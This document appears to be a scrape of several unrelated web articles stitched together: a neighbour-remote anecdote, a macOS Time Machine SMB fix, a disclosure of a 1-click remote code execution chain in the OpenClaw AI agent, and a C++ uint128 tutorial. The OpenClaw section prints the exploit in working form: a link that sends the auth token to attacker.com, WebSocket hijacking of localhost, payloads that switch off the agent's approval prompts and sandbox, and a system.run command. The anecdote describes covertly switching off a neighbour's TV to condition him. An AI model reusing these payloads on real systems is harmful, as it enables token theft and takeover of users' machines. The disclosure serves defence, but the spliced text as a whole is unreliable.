    &lt;p&gt;"Hi, I'm Ibrahim. Your upstairs neighbor..." I started and was interrupted almost immediately. "Whatever you are selling," he yelled. "I'm not buying." and he closed the door on my face. I knocked a second time, because obviously there was a misunderstanding. He never answered. Instead, the TV turned on and a movie played at high volume. So much for my prepared speech.&lt;/p&gt;
    &lt;p&gt;The RF settings on my set-top box remained turned off. My family never discovered its benefit anyway, they always pointed at the box when pressing the buttons. It wasn't much of an inconvenience. In fact, I later found in the manual that you could reprogram the device and remote to use a different frequency. I did not reprogram my remote. Instead, my family used the two IR remotes, and brought the RF remote in my bedroom where it permanently remained on my night stand.&lt;/p&gt;
    &lt;p&gt;Why in the bedroom? Because I decided to teach my neighbor some good manners. Whenever he turned up his volume, I would simply turn off his device. I would hear his frustration, and his attempts at solving the problem. Like a circus animal trainer, I remained consistent. If the volume of his TV went above what I imagined to be 15 to 20, I would press the power button. It became a routine for me for weeks. Some nights were difficult, I would keep the remote under my pillow, battling my stubborn neighbor all night.&lt;/p&gt;
    &lt;p&gt;One day, I noticed that I hadn't pressed the button in days. I opened the window and I could still hear the faint sound of his TV. Through trial and error, he learned the lesson. If the volume remained under my arbitrary threshold, the TV would remain on. But as soon as he passed that threshold, the device would turn off.&lt;/p&gt;
    &lt;p&gt;Sometimes, he would have company and there would be noise coming out of his apartment. I used the one tool in my tool box to send him a message. Turn off the TV. All of the sudden, my neighbor and his guest will be reminded of the unspoken rules, and become mindful of their neighbors.&lt;/p&gt;
    &lt;p&gt;Maybe somewhere on the web, in some obscure forum, someone asked the question: "Why does my set-top box turn off when I increase the volume?" Well, it might be 18 years too late, but there's your answer. There is a man out there who religiously sets his volume to 18. He doesn't quite know why. That's Pavlovian conditioning at its best.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;So… Here we are again.&lt;/p&gt;
    &lt;p&gt;Today, after a minor disaster with my Obsidian vault, I decided to restore from Time Machine, and… I realized that it had silently broken across both my Tahoe machines. I use a Synology NAS as Time Machine target, exporting the share over SMB and that has worked flawlessly for years, but this came as a surprise because I could have sworn it was working fine a couple of months ago–but no, it wasn’t.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;For clarity: It just stopped doing backups, silently. No error messages, no notifications, nothing. Just no backups for around two months. On my laptop, I only noticed because I was trying to restore a file and the latest backup was from December. On my desktop, I had a Thunderbolt external drive as a secondary backup.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;After some research, I found out that the issue is with Apple’s unilateral decision to change their SMB defaults (without apparently notifying anyone), and came across a few possible fixes.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Seems To Be Working Now&lt;/head&gt;
    &lt;p&gt;I found this gist, which I am reproducing here for posterity, that seems to be working for me, but which entails editing the &lt;code&gt;nsmb.conf&lt;/code&gt; file on the Mac itself–which is not exactly ideal, since I’m pretty sure Apple will break this again in the future.&lt;/p&gt;
    &lt;code&gt;sudo nano /etc/nsmb.conf # I used vim, of course
&lt;/code&gt;
    &lt;p&gt;…and adding the following lines (the file should be empty):&lt;/p&gt;
    &lt;code&gt;[default]
signing_required=yes
streams=yes
soft=yes
dir_cache_max_cnt=0
protocol_vers_map=6
mc_prefer_wired=yes
&lt;/code&gt;
    &lt;p&gt;The explanation here is that macOS Tahoe changed the default from &lt;code&gt;signing_required=no&lt;/code&gt; to stricter control, and NAS devices with relaxed SMB settings cannot handle this without explicit configuration.&lt;/p&gt;
    &lt;p&gt;Another common pitfall is name encoding issues in machine names, so you should remove Non-ASCII Characters from the &lt;code&gt;.sparsebundle&lt;/code&gt; name (that wasn’t an issue for me, but YMMV).&lt;/p&gt;
    &lt;p&gt;On the Synology side, the recommendation was to go to &lt;code&gt;Control Panel &amp;gt; File Services &amp;gt; SMB &amp;gt; Advanced&lt;/code&gt; and set:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Maximum SMB protocol: SMB3&lt;/item&gt;
      &lt;item&gt;Enable Opportunistic Locking: Yes&lt;/item&gt;
      &lt;item&gt;Enable SMB2 Lease: Yes&lt;/item&gt;
      &lt;item&gt;Enable SMB Durable Handles: Yes&lt;/item&gt;
      &lt;item&gt;Server signing: No (or “Auto”)&lt;/item&gt;
      &lt;item&gt;Transport encryption: Disabled&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;That doesn’t quite match my DSM UI, but it’s close enough, and my settings now look like this:&lt;/p&gt;
    &lt;head rend="h2"&gt;My Backup Backup Plan&lt;/head&gt;
    &lt;p&gt;Since I’m tired of Apple breaking Time Machine every few years and the lack of transparency around this (it’s not Synology’s fault), I have decided to implement a more robust solution that doesn’t depend on Synology’s SMB implementation.&lt;/p&gt;
    &lt;p&gt;I already have a Proxmox server with ZFS as the backend storage that has an LXC container running Samba for general file sharing, so I decided to look into that as a possible Time Machine target.&lt;/p&gt;
    &lt;p&gt;As it happens, &lt;code&gt;mbentley/timemachine&lt;/code&gt; is a Docker image specifically designed for this purpose, and it seems to be well-maintained, so I’m testing it like this:&lt;/p&gt;
    &lt;code&gt;services:
  timemachine:
    image: mbentley/timemachine:smb
    container_name: timemachine
    restart: always
    network_mode: host
    environment:
      - TM_USERNAME=timemachine
      - TM_GROUPNAME=timemachine
      - PASSWORD=timemachine
      - TM_UID=65534 # 'nobody' user
      - TM_GID=65534 # 'nobody' group
      - SET_PERMISSIONS=false
      - VOLUME_SIZE_LIMIT=0
    volumes:
      # this is a pass-though mountpoint to the ZFS volume in Proxmox
      - /mnt/shares/timemachine:/opt/timemachine
    tmpfs:
      - /run/samba
&lt;/code&gt;
    &lt;p&gt;Right now the first option seems to be working, but I will probably switch to the Docker solution in the near future, since it gives me more control over the SMB implementation and avoids relying on Synology’s software.&lt;/p&gt;
    &lt;p&gt;But if anyone from Apple is reading this: please, stop breaking Time Machine every few years. It’s a critical piece of infrastructure for many users, and the lack of communication around these changes is frustrating.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Minor, Yet Annoying, Additional Problem&lt;/head&gt;
    &lt;p&gt;Plus I’m annoyed enough that earlier this morning I tried to set up a new iOS device and the infamous &lt;code&gt;Restore in Progress: An estimated 100 MB will be downloaded…&lt;/code&gt; bug (which has bitten me repeatedly over the last six years) is still there.&lt;/p&gt;
    &lt;p&gt;The usual fix was hitting &lt;code&gt;Reset Network Settings&lt;/code&gt; and a full hardware reboot, plus reconnecting to Wi-Fi… But this time it took three attempts.&lt;/p&gt;
    &lt;p&gt;Come on, Apple, get your act together. Hire people who care about the OS experience, not just Liquid Glass.&lt;/p&gt;

  &lt;main&gt;&lt;p&gt;February 1, 2026&lt;/p&gt;&lt;p&gt;OpenClaw (formerly Moltbot and ClawdBot), the open-source AI personal assistant that can take actions on your behalf, is the most popular topic on X right now. It is already trusted by over 100,000 developers to hold the keys to their digital life, from iMessage/WhatsApp/Slack access to unrestricted local computer control. But when you grant an agent "god mode" permissions, the margin for error vanishes. While the community celebrated its capabilities, depthfirst General Security Intelligence silently audited its code and found a critical vulnerability. I investigated the finding, combined it with a vulnerability I discovered, and chained them into a 1-Click Remote Code Execution (RCE) exploit. With this exploit, a single visit to a malicious webpage was enough to hack your computer and AI assistant.&lt;/p&gt;&lt;p&gt;I’ll dissect the logic flaw depthfirst uncovered and walk you through the exact kill chain I built to weaponize it.&lt;/p&gt;&lt;p&gt;Codebases are rarely linear; logic is scattered, fragmented, and buried across dozens of files. That’s where the complexity and bugs hide.&lt;/p&gt;&lt;p&gt;Our system maps the full flow of an application's lifecycle. Here, our engine stitched together a data flow across the stack to reveal a critical logic gap:&lt;/p&gt;&lt;p&gt;1. Ingestion: &lt;code&gt;app-settings.ts&lt;/code&gt; blindly accepts a &lt;code&gt;gatewayUrl&lt;/code&gt; query parameter in the URL and persists it to storage. For example, &lt;code&gt;https://localhost?gatewayUrl=attacker.com&lt;/code&gt; would save &lt;code&gt;attacker.com&lt;/code&gt; as the new gateway url.&lt;/p&gt;&lt;code&gt;1const gatewayUrlRaw = params.get("gatewayUrl");
2...
3if (gatewayUrlRaw != null) {
4  const gatewayUrl = gatewayUrlRaw.trim();
5  if (gatewayUrl &amp;amp;&amp;amp; gatewayUrl !== host.settings.gatewayUrl) {
6    applySettings(host, { ...host.settings, gatewayUrl }); // persisted via saveSettings -&amp;gt; localStorage
7  }
8}
9&lt;/code&gt;&lt;p&gt;2. Processing: &lt;code&gt;app-lifecycle.ts&lt;/code&gt; triggers &lt;code&gt;connectGateway()&lt;/code&gt; immediately after settings (such as the gateway url) are applied.&lt;/p&gt;&lt;code&gt;1handleConnected(host) {
2  ...
3  connectGateway(host); // runs immediately on load after parsing URL params
4  startNodesPolling(host);
5  ...
6}&lt;/code&gt;&lt;p&gt;3. Protocol Execution: gateway.ts automatically bundles the security-sensitive authToken into the system’s connection handshake to the new gateway.&lt;/p&gt;&lt;code&gt;1const params = { ... , authToken, locale: navigator.language };
2void this.request&amp;lt;GatewayHelloOk&amp;gt;("connect", params);&lt;/code&gt;&lt;p&gt;In isolation, each of these operations are safe. However, the depthfirst scan recognized that together, these operations create a critical security issue. Our engine flagged the dangerous pattern: clicking a URL can force a connection and leak the authentication token to an attacker.&lt;/p&gt;&lt;p&gt;Here’s a preview of the finding in the depthfirst UI:&lt;/p&gt;&lt;p&gt;Directly exploiting an insecurely configured internet-facing OpenClaw is trivial but limited in impact and scope.&lt;/p&gt;&lt;p&gt;These are the exploit steps:&lt;/p&gt;&lt;p&gt;1. The victim clicks a malicious link (or visits a site that forwards them to the malicious link), &lt;code&gt;http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;2. The attacker listening to WebSocket connections on their server receives the &lt;code&gt;auth&lt;/code&gt; token.&lt;/p&gt;&lt;p&gt;3. The attacker logs in to the victim’s OpenClaw instance using the stolen token.&lt;/p&gt;&lt;p&gt;The attacker can now access the victim’s personal data and perform actions on the victim’s behalf. This can include reading text messages and Stripe API keys. Specific exploitation depends on which data the victim set up OpenClaw with.&lt;/p&gt;&lt;p&gt;This is bad enough, but this direct exploitation method has 3 limitations:&lt;/p&gt;&lt;p&gt;Here’s how I overcame those 3 limitations and demonstrated this vulnerability can be weaponized to achieve 1-Click remote code execution.&lt;/p&gt;&lt;code&gt;localhost&lt;/code&gt; Network Restrictions&lt;p&gt;Most users run OpenClaw on &lt;code&gt;localhost&lt;/code&gt;. As a result, their OpenClaw is inaccessible from the internet. Even if an attacker has a valid auth token, they can’t access a victim’s local OpenClaw. &lt;/p&gt;&lt;p&gt;However, I found a bug to bypass this otherwise frustrating restriction.&lt;/p&gt;&lt;p&gt;Regularly, &lt;code&gt;attacker.com&lt;/code&gt; can’t make arbitrary client-side requests to localhost. This is because Same Origin Policy (SOP) prevents separate origins (sites) from fully interacting with each other.&lt;/p&gt;&lt;p&gt;While browsers apply SOP to http connections, they do not to WebSocket ones. It’s a WebSocket server’s responsibility to validate a request's &lt;code&gt;origin&lt;/code&gt; and decide whether to accept the connection. I found that OpenClaw’s WebSocket server fails to validate the WebSocket &lt;code&gt;origin&lt;/code&gt; header, accepting requests from any site.&lt;/p&gt;&lt;p&gt;This allows me to perform Cross-Site WebSocket Hijacking (CSWSH). When the victim visits &lt;code&gt;attacker.com&lt;/code&gt;, I can run JavaScript on the victim’s browser to open a connection to &lt;code&gt;ws://localhost:18789&lt;/code&gt; . The browser acts as a pivot point between &lt;code&gt;attacker.com&lt;/code&gt; and the victim’s otherwise inaccessible &lt;code&gt;localhost&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;OpenClaw has robust safety features to limit the risk from agent-side threats. By default, it uses &lt;code&gt;exec-approvals.json&lt;/code&gt; to prompt the user before running dangerous commands, and it can be configured to run shell tools inside a containerized sandbox.&lt;/p&gt;&lt;p&gt;However, these protections are managed via the API itself. Because the stolen token grants &lt;code&gt;operator.admin&lt;/code&gt; and &lt;code&gt;operator.approvals&lt;/code&gt; scopes, I don't need to find a vulnerability in the sandbox implementation to bypass it. I can simply use the API to disable the safety features.&lt;/p&gt;&lt;code&gt;exec.approvals.set&lt;/code&gt; request to set &lt;code&gt;ask: "off"&lt;/code&gt;. Now the agent won't ask the user for permission to run dangerous commands.&lt;code&gt;config.patch&lt;/code&gt; request to set &lt;code&gt;tools.exec.host &lt;/code&gt;to "gateway". This forces the agent to run commands directly on the host machine, not inside a Docker container.&lt;code&gt;1// Payload to disable user prompts
2{
3  "method": "exec.approvals.set",
4  "params": { "defaults": { "security": "full", "ask": "off" } }
5}&lt;/code&gt;&lt;p&gt;Putting it all together, the attack happens in milliseconds after the victim visits a webpage. The victim does not need to type anything or approve any prompts.&lt;/p&gt;&lt;code&gt;attacker.com&lt;/code&gt; (in practice, an inconspicuous url)&lt;code&gt;attacker.com&lt;/code&gt; executes on the victim browser, opening a background window to &lt;code&gt;http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080&lt;/code&gt;. This sends the auth token to &lt;code&gt;attacker.com:8080&lt;/code&gt;&lt;code&gt;attacker.com&lt;/code&gt; executing on the victim browser creates a WebSocket connection to &lt;code&gt;ws://localhost:18789&lt;/code&gt; (default OpenClaw server setup) and passes authentication using the stolen token. It then makes API request to: &lt;p&gt;Finally, to achieve arbitrary command execution, the attacker JavaScript executes a &lt;code&gt;node.invoke&lt;/code&gt; request:&lt;/p&gt;&lt;code&gt;1{
2     "type": "req",
3     "id": "4",
4     "method": "node.invoke",
5     "params": {
6          "nodeId": "main",
7          "command": "system.run",
8          "params": {
9               "cmd": "bash -c 'echo hacked &amp;gt; /tmp/hacked'"
10          },
11          "timeoutMs": 60000,
12          "idempotencyKey": "rev1"
13     }
14}&lt;/code&gt;&lt;p&gt;The OpenClaw team quickly addressed and fixed the issue I reported. Here’s the GitHub Advisory. I found there was another person who found and reported the same bug. The patch adds a gateway URL confirmation modal, removing the auto-connect-without-prompt behavior.&lt;/p&gt;&lt;p&gt;All versions up to v2026.1.24-1 are vulnerable. Please upgrade your OpenClaw and rotate tokens if you suspect yours may have leaked.&lt;/p&gt;&lt;p&gt;depthfirst is building the intelligence layer to catch these logic flaws before the attackers do. If you’re shipping code, let's talk.&lt;/p&gt;&lt;p&gt;Secure your code to ship faster&lt;/p&gt;&lt;p&gt;Link your Github repo in three clicks.&lt;/p&gt;&lt;/main&gt;

    &lt;head rend="h1"&gt;Building Your Own Efficient uint128 in C++&lt;/head&gt;
    &lt;p&gt;A practical walk-through of a fixed-width uint128 implementation in modern C++.&lt;/p&gt;
    &lt;p&gt;We build a minimal &lt;code&gt;u128&lt;/code&gt; as two &lt;code&gt;u64&lt;/code&gt; limbs and implement arithmetic using carry, borrow, and multiply intrinsics that map directly to x64 instructions.
The generated code is on par with builtin &lt;code&gt;__uint128_t&lt;/code&gt; for addition, subtraction, multiplication, and comparison.
This is unsigned-only, x64-focused, and intentionally narrow in scope.
The result is a solid foundation for exact, fixed-width arithmetic with a focus on good codegen and predictability, not abstraction.&lt;/p&gt;
    &lt;p&gt;Full code and compiler output: https://godbolt.org/z/K6dn3s91Y&lt;/p&gt;
    &lt;head rend="h2"&gt;Scope&lt;/head&gt;
    &lt;p&gt;We take the smallest reasonable definition of a 128-bit integer, two 64-bit words, and turn it into a usable arithmetic type whose generated code is indistinguishable from a builtin &lt;code&gt;__uint128_t&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;This post is explicitly not about dynamically-sized big integer arithmetic. It is about being explicit with range bounds and letting the compiler emit the exact instructions we want. The scope is deliberately limited: unsigned arithmetic, fixed width, modern x64, with Clang and GCC as the primary targets and notes for MSVC where it differs.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why fixed-width big integers&lt;/head&gt;
    &lt;p&gt;In many domains, especially geometry and numerics, we do not need arbitrary precision. We need enough precision to be exact for known bounds, and we need the cost to be predictable.&lt;/p&gt;
    &lt;p&gt;Dynamic big integer libraries solve a different problem. They are flexible and general, but they pay for that generality in memory traffic, branches, and indirection. If your values fit into a fixed number of bits and you know that ahead of time, fixed-width arithmetic is usually the better trade. (In fact, our high-performance exact mesh booleans are completely built on this: Exact Arithmetic in Solidean)&lt;/p&gt;
    &lt;p&gt;A 128-bit integer is the gateway drug to fixed-width arithmetic. It is the smallest width that is no longer builtin, while still mapping cleanly to the underlying hardware. Once the carry and multiply patterns are explicit at 128 bits, extending them to 192 or 256 bits is straightforward. In production, we use 256-bit integers in our hot paths and go up to 564 bits for certain edge cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;Representation&lt;/head&gt;
    &lt;p&gt;We represent a 128-bit unsigned integer as two 64-bit limbs. You can literally think of this as writing the &lt;code&gt;u128&lt;/code&gt; as a 2-digit number in base \(2^{64}\).
Because it's unsigned, we don't need to think about two's complement.&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;cstdint&amp;gt;
#include &amp;lt;immintrin.h&amp;gt; // _addcarry_u64, _subborrow_u64, _mulx_u64

// this is the type used in the intrinsics signature
// (and uint64_t is unsigned long, not unsigned long long...)
using u64 = unsigned long long;

struct u128
{
    u64 low = 0;
    u64 high = 0;
};
&lt;/code&gt;
    &lt;head rend="h2"&gt;Addition, with carry&lt;/head&gt;
    &lt;p&gt;We start off easy. Addition is simply done using long addition on our base \(2^{64}\) digits. The intrinsic &lt;code&gt;_addcarry_u64&lt;/code&gt; corresponds to the x64 instruction &lt;code&gt;adc&lt;/code&gt; and is exactly what we need:
Given two &lt;code&gt;u64&lt;/code&gt; summands and an input carry (0 or 1), we get the &lt;code&gt;u64&lt;/code&gt; result (via a slightly cumbersome output parameter) and a new carry.&lt;/p&gt;
    &lt;code&gt;u128 operator+(u128 a, u128 b) 
{
    u128 r;
    unsigned char c = _addcarry_u64(0, a.low,  b.low,  &amp;amp;r.low);
    (void)_addcarry_u64(c, a.high, b.high, &amp;amp;r.high);
    return r;
}
&lt;/code&gt;
    &lt;p&gt;The generated assembly is exactly what you would write by hand.&lt;/p&gt;
    &lt;code&gt;operator+(u128, u128):
        mov     rax, rdi
        add     rax, rdx
        adc     rsi, rcx
        mov     rdx, rsi
        ret
&lt;/code&gt;
    &lt;p&gt;The moves are just calling convention noise. The core is an &lt;code&gt;add&lt;/code&gt; (because the first addition has no input carry) followed by an &lt;code&gt;adc&lt;/code&gt;.
This is identical to what the compiler emits for &lt;code&gt;__uint128_t&lt;/code&gt; addition.&lt;/p&gt;
    &lt;p&gt;A small but important point is that intrinsics are preferable to inline assembly here. They act like specialized IR operations. The compiler understands their semantics, can schedule around them, and can still optimize aggressively. Inline assembly is more of a black box and much easier to get wrong or inhibit optimizations.&lt;/p&gt;
    &lt;head rend="h2"&gt;Subtraction: same story, inverted&lt;/head&gt;
    &lt;p&gt;Subtraction mirrors addition almost perfectly. Instead of a carry, we track a borrow. On x64, this is &lt;code&gt;sbb&lt;/code&gt;, subtract with borrow.
The corresponding intrinsic is &lt;code&gt;_subborrow_u64&lt;/code&gt;.&lt;/p&gt;
    &lt;code&gt;u128 operator-(u128 a, u128 b) 
{
    u128 r;
    unsigned char c = _subborrow_u64(0, a.low,  b.low,  &amp;amp;r.low);
    (void)_subborrow_u64(c, a.high, b.high, &amp;amp;r.high);
    return r;
}
&lt;/code&gt;
    &lt;p&gt;And again, the assembly is exactly what we want.&lt;/p&gt;
    &lt;code&gt;operator-(u128, u128):
        mov     rax, rdi
        sub     rax, rdx
        sbb     rsi, rcx
        mov     rdx, rsi
        ret
&lt;/code&gt;
    &lt;p&gt;At this point, addition and subtraction are basically solved. There is no hidden cost and no abstraction penalty. It's also easy to see how this scales to larger integer types with one extra instruction per &lt;code&gt;u64&lt;/code&gt; "digit".&lt;/p&gt;
    &lt;head rend="h2"&gt;Multiplication: regrouping our &lt;code&gt;u64&lt;/code&gt; digits&lt;/head&gt;
    &lt;p&gt;Multiplication is where things get more interesting. A 128-bit by 128-bit multiply produces a 256-bit result but we want only the lower 128 bit for our result. Same story with &lt;code&gt;u64 * u64&lt;/code&gt; really, which produces a 128 bit result in theory, but you usually only use the lower &lt;code&gt;u64&lt;/code&gt;.
Speaking of which, all modern 64-bit architectures give you access to fast &lt;code&gt;u64 * u64 -&amp;gt; u128&lt;/code&gt; instructions.
With BMI2, this is exposed as &lt;code&gt;_mulx_u64&lt;/code&gt;.
On MSVC, the equivalent is &lt;code&gt;_umul128&lt;/code&gt;.
This is our building block for large multiplication.&lt;/p&gt;
    &lt;p&gt;You can derive the code from writing the &lt;code&gt;u128 * u128&lt;/code&gt; as 2-digit long multiplication &lt;code&gt;(u64, u64) * (u64, u64)&lt;/code&gt; and then look sharply at what sums up to which digit.&lt;/p&gt;
    &lt;p&gt;That's how I do it on paper, but here we can also choose an algebraic route. Write the numbers as: $$ (a.\text{low} + 2^{64} \cdot a.\text{high}) \cdot (b.\text{low} + 2^{64} \cdot b.\text{high}) $$ Expanding this gives four terms. Of those, only three contribute to the low 128 bits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;\(a_\text{low} \cdot b_\text{low}\) contributes both low and high parts&lt;/item&gt;
      &lt;item&gt;\(a_\text{low} \cdot b_\text{high}\) contributes to bits 64..127&lt;/item&gt;
      &lt;item&gt;\(a_\text{high} \cdot b_\text{low}\) contributes to bits 64..127&lt;/item&gt;
      &lt;item&gt;\(a_\text{high} \cdot b_\text{high}\) contributes only above bit 128 and can be discarded&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This works for larger integers as well, though summing up intermediate terms can produce carries for "higher digits".&lt;/p&gt;
    &lt;code&gt;u128 operator*(u128 a, u128 b) 
{
    // we want the low 128 bits of:
    // (a.low + 2^64 a.high) * (b.low + 2^64 b.high)
    //
    // r.low  = lo64(a.low * b.low)
    // r.high = hi64(a.low * b.low)
    //        + lo64(a.low * b.high)
    //        + lo64(a.high * b.low)        (mod 2^64)

    // NOTE (MSVC): for multiply, you can use _umul128(a, b, &amp;amp;hi) instead of _mulx_u64.
    //              Clang/GCC: _mulx_u64 is BMI2 and needs -mbmi2.

    u128 r;

    u64 p0_hi;
    r.low = _mulx_u64(a.low, b.low, &amp;amp;p0_hi);

    // cross terms: only the low 64 bits contribute to r.high
    u64 t1_hi;
    u64 t1_lo = _mulx_u64(a.low,  b.high, &amp;amp;t1_hi);

    u64 t2_hi;
    u64 t2_lo = _mulx_u64(a.high, b.low,  &amp;amp;t2_hi);

    // simply add is sufficient: carries would land in bit 128 and are discarded
    r.high = p0_hi + t1_lo + t2_lo;

    return r;
}
&lt;/code&gt;
    &lt;p&gt;Note that we do not need carry handling there. Any carry out of bit 127 would land in bit 128, which we are discarding anyway.&lt;/p&gt;
    &lt;p&gt;The compiler output reflects this reasoning.&lt;/p&gt;
    &lt;code&gt;operator*(u128, u128):
        mulx    r8, rax, rdi
        imul    rcx, rdi
        imul    rdx, rsi
        add     rdx, rcx
        add     rdx, r8
        ret
&lt;/code&gt;
    &lt;p&gt;The compiler chooses slightly different instructions and registers for the builtin &lt;code&gt;__uint128_t&lt;/code&gt; multiplication but is otherwise identical as well.&lt;/p&gt;
    &lt;head rend="h2"&gt;Equality&lt;/head&gt;
    &lt;p&gt;Now an easy one. &lt;code&gt;u128&lt;/code&gt; equality is simple structural equality.&lt;/p&gt;
    &lt;code&gt;bool operator==(u128 a, u128 b) 
{
    return a.low == b.low &amp;amp;&amp;amp; a.high == b.high;
}
&lt;/code&gt;
    &lt;p&gt;The generated assembly is worth a quick look.&lt;/p&gt;
    &lt;code&gt;operator==(u128, u128):
        xor     rdi, rdx
        xor     rsi, rcx
        or      rsi, rdi
        sete    al
        ret
&lt;/code&gt;
    &lt;p&gt;Instead of branching (as you might expect from the short-circuiting of &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;), the compiler XORs the corresponding limbs.
XOR produces zero if and only if the inputs are equal.
ORing the results combines the checks.
If the final value is zero, both limbs were equal.&lt;/p&gt;
    &lt;p&gt;This pattern continues for larger integers, though we might see branching due to short-circuiting at some point. (We could of course just use the XOR approach in &lt;code&gt;operator==&lt;/code&gt; but it is distinctly less readable.)&lt;/p&gt;
    &lt;head rend="h2"&gt;Comparison: borrow beats branching&lt;/head&gt;
    &lt;p&gt;The straightforward way to compare two 128-bit integers is to compare the high parts first and then the low parts.&lt;/p&gt;
    &lt;code&gt;bool operator&amp;lt;(u128 a, u128 b)
{
    if (a.high != b.high) return a.high &amp;lt; b.high;
    return a.low &amp;lt; b.low;
}
&lt;/code&gt;
    &lt;p&gt;This is correct, but the codegen is not great:&lt;/p&gt;
    &lt;code&gt;operator&amp;lt;(u128, u128):
        xor     r8d, r8d
        cmp     rdi, rdx
        setb    r8b
        xor     eax, eax
        cmp     rsi, rcx
        setb    al
        cmove   eax, r8d
        ret
&lt;/code&gt;
    &lt;p&gt;Works, but heavier than necessary. We can do better by leaning on the hardware borrow flag.&lt;/p&gt;
    &lt;p&gt;Unsigned comparison &lt;code&gt;a &amp;lt; b&lt;/code&gt; is equivalent to checking whether &lt;code&gt;a - b&lt;/code&gt; produces a borrow:&lt;/p&gt;
    &lt;code&gt;bool operator&amp;lt;(u128 a, u128 b) 
{
    u64 dont_care;

    // compute borrow from (a.low - b.low). If a.low &amp;lt; b.low =&amp;gt; borrow = 1.
    unsigned char borrow = _subborrow_u64(0, a.low, b.low, &amp;amp;dont_care);

    // now subtract highs with that borrow
    // final borrow tells us if a &amp;lt; b in 128-bit unsigned.
    borrow = _subborrow_u64(borrow, a.high, b.high, &amp;amp;dont_care);

    return borrow != 0;
}
&lt;/code&gt;
    &lt;p&gt;The resulting assembly is minimal:&lt;/p&gt;
    &lt;code&gt;operator&amp;lt;(u128, u128):
        cmp     rdi, rdx
        sbb     rsi, rcx
        setb    al
        ret
&lt;/code&gt;
    &lt;p&gt;One compare, one subtract with borrow, and a flag check. This is exactly the kind of codegen we want in hot code.&lt;/p&gt;
    &lt;head rend="h2"&gt;A small use site&lt;/head&gt;
    &lt;p&gt;To make sure everything composes properly, let's build a slightly larger function.&lt;/p&gt;
    &lt;code&gt;u128 demo_u128(u128 a, u128 b) 
{
    u128 x = a + b;
    u128 y = a * b;
    return x &amp;lt; y
            ? y - x
            : x - y;
}
&lt;/code&gt;
    &lt;p&gt;All operators inline cleanly:&lt;/p&gt;
    &lt;code&gt;demo_u128(u128, u128):
        mov     r8, rdi
        add     r8, rdx
        mov     r9, rsi
        adc     r9, rcx
        mulx    rax, r10, rdi
        imul    rcx, rdi
        imul    rdx, rsi
        add     rdx, rcx
        add     rdx, rax
        mov     rax, r8
        sub     rax, r10
        mov     rcx, r9
        sbb     rcx, rdx
        jae     .LBB13_2
        sub     r10, r8
        sbb     rdx, r9
        mov     rax, r10
        mov     rcx, rdx
.LBB13_2:
        mov     rdx, rcx
        ret
&lt;/code&gt;
    &lt;p&gt;There is a branch for the ternary operator while the builtin version uses conditional moves instead. Which is better depends on data patterns but could go either way. I consider this basically as good as it gets.&lt;/p&gt;
    &lt;head rend="h2"&gt;Platform notes&lt;/head&gt;
    &lt;p&gt;The examples shown are for x64 with Clang or GCC.&lt;/p&gt;
    &lt;p&gt;On MSVC, &lt;code&gt;_addcarry_u64&lt;/code&gt; and &lt;code&gt;_subborrow_u64&lt;/code&gt; work the same way.
For multiplication, &lt;code&gt;_umul128&lt;/code&gt; replaces &lt;code&gt;_mulx_u64&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;On AArch64, the same approach applies using &lt;code&gt;adds&lt;/code&gt; and &lt;code&gt;adcs&lt;/code&gt; instructions for addition, &lt;code&gt;subs&lt;/code&gt; and &lt;code&gt;sbcs&lt;/code&gt; for subtraction, and &lt;code&gt;mul + umulh&lt;/code&gt; for the low + high half of a 64-bit multiply.
The patterns carry over directly, even though the intrinsics differ slightly (and multiplication is split into two parts).&lt;/p&gt;
    &lt;head rend="h2"&gt;Outlook&lt;/head&gt;
    &lt;p&gt;This &lt;code&gt;u128&lt;/code&gt; is the easiest large integer you can write.
Our goal is best performance, so we made sure that codegen is reasonably identical to the builtin &lt;code&gt;__uint128_t&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;From here, the same patterns extend naturally to signed variants, widening multiplies such as u128 times u128 to u256, and chains of fixed-width integers like i192 or i256. More importantly, the same reasoning applies when you design predicate-specific arithmetic that only computes what is actually needed.&lt;/p&gt;
    &lt;p&gt;A lot of our performance really boils down to these types: No &lt;code&gt;BigInteger&lt;/code&gt; tax, no floating predicates (that need a few kB of stack space for the worst case).
Just a lot of straightline integer code and some light static branching.&lt;/p&gt;
    &lt;head rend="h2"&gt;Addendum 2026-01-24&lt;/head&gt;
    &lt;p&gt;Some notes based on reader feedback.&lt;/p&gt;
    &lt;p&gt;On PowerPC: I don't know much about PowerPC or the availability of intrinsics, but the instructions you need are definitely there. For add/sub with carry, there's addc / adde for addition and subfc / subfe for subtraction with borrow. For wide multiplication, mulhdu gives you the high half of a 64-bit multiply (and mulhd for signed).&lt;/p&gt;
    &lt;p&gt;On GCC codegen with intrinsics: Someone pointed out that GCC doesn't always handle the intrinsic-based addition optimally. It sometimes moves the result through the stack before setting it in the final registers. This is related to writing directly to the result struct. If you write to "real" scalars first, the codegen is optimal again. A weird one.&lt;/p&gt;
    &lt;p&gt;On division: There is no neat codegen for division. Even the builtin delegates to a library call. The naive but practical approach is binary long division, which finishes in up to 128 steps. Either branchless with fixed runtime or with a loop that searches for the next set bit. Either way it's a bit of work. Our exact predicates are always formulated in a division-free way simply because division would be expensive.&lt;/p&gt;
    &lt;p&gt;On &lt;code&gt;_BitInt(N)&lt;/code&gt;:
The upcoming &lt;code&gt;_BitInt(N)&lt;/code&gt; type does work, but with caveats.
For B = 128, you get the normal codegen.
For B &amp;gt; 128, GCC calls into a function where the bit size is a runtime parameter.
So yes, they would work, but performance will be subpar for larger widths.
